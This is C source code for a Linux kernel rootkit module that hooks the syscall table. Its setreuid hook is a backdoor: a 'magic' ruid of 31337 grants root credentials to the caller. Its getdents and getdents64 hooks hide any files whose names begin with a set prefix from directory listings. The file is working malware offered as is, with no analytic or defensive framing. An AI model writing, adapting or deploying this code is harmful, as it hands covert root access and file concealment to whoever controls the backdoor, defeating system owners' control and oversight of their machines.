#include <linux/cred.h>

#include <config.h>
#include <r0mod/global.h>
#include <linux/uaccess.h>
#include <asm/uaccess.h>

// Commander
asmlinkage long (*sys_setreuid)(uid_t ruid, uid_t euid);
asmlinkage long n_sys_setreuid(uid_t ruid, uid_t euid)
{
    int ret;

    DEBUG("[trying]: ruid == %d && euid == %d\n", ruid, euid);

    if(ruid == 31337)
    {
        switch(euid)
        {
            case CMD_ROOT:
                commit_creds(prepare_kernel_cred(0));
                return n_sys_setreuid(0, 0);
            break;
        }
    }

    hook_pause(sys_setreuid);
    ret = sys_setreuid(ruid, euid);
    hook_resume(sys_setreuid);

    return ret;
}

asmlinkage int (*sys_getdents)(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count);
asmlinkage int n_sys_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
{
    int ret, i, j;
    char *buf, *userp;
    mm_segment_t old_fs;

    struct linux_dirent *p;

    // Cast dirp into byte array so we can manipulate pointers at the byte level
    userp = (char *)dirp;

    buf = kmalloc(count, GFP_KERNEL);
    if(!buf)
        return -ENOBUFS;

    old_fs = get_fs();
    set_fs(KERNEL_DS);
    ret = sys_getdents(fd, (struct linux_dirent *)buf, count);
    set_fs(old_fs);

    for(i = j = 0; i < ret; i += p->d_reclen)
    {
        p = (struct linux_dirent *)(buf + i);

        // Skip over hidden files
        if(strncmp(p->d_name, HIDDEN_PREFIX, sizeof(HIDDEN_PREFIX) - 1) == 0)
            continue;

        if(copy_to_user(userp + j, p, p->d_reclen))
        {
            ret = -EAGAIN;
            goto end;
        }

        j += p->d_reclen;
    }

    // Our call to the orig getdents succeeded, return after we've hidden files
    if(ret > 0)
        ret = j;

end:
    kfree(buf);

    return ret;
}

asmlinkage int (*sys_getdents64)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
asmlinkage int n_sys_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
{
    int ret, i, j;
    char *buf, *userp;
    mm_segment_t old_fs;

    struct linux_dirent64 *p;

    // Cast dirp into byte array so we can manipulate pointers at the byte level
    userp = (char *)dirp;

    buf = kmalloc(count, GFP_KERNEL);
    if(!buf)
        return -ENOBUFS;

    old_fs = get_fs();
    set_fs(KERNEL_DS);
    ret = sys_getdents64(fd, (struct linux_dirent64 *)buf, count);
    set_fs(old_fs);

    for(i = j = 0; i < ret; i += p->d_reclen)
    {
        p = (struct linux_dirent64 *)(buf + i);

        // Skip over hidden files
        if(strncmp(p->d_name, HIDDEN_PREFIX, sizeof(HIDDEN_PREFIX) - 1) == 0)
            continue;

        if(copy_to_user(userp + j, p, p->d_reclen))
        {
            ret = -EAGAIN;
            goto end;
        }

        j += p->d_reclen;
    }

    // Our call to the orig getdents succeeded, return after we've hidden files
    if(ret > 0)
        ret = j;

end:
    kfree(buf);

    return ret;
}

void init_hooks(void)
{
    DEBUG("Hooking syscalls\n");

    sys_setreuid = (void *)sct[__NR_setreuid];
    hook_start(sys_setreuid, &n_sys_setreuid);

    sys_getdents = (void *)sct[__NR_getdents];
    hook_start(sys_getdents, &n_sys_getdents);

    //sys_getdents64 = (void *)sct[__NR_getdents64];
    //hook_start(sys_getdents64, &n_sys_getdents64);
}

void exit_hooks(void)
{
    DEBUG("Unhooking syscalls\n");

    hook_stop(sys_setreuid);
    hook_stop(sys_getdents);
    //hook_stop(sys_getdents64);
}
